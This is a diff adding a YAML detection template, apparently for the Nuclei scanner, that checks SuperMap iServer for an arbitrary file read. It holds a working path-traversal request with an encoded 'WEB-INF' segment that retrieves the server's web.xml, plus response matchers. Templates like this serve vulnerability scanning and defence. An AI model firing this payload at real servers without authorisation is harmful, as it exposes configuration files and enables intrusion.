@@ -1,0 +1,25 @@
+id: supermap-iserver-output-anyfile-read
+info:
+  name: Supermap iServer Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iserver/output/../WEB-IN%2546/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>SuperMap iServer</display-name>"
+          - "<filter-mapping>"
+          - "web-app>"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
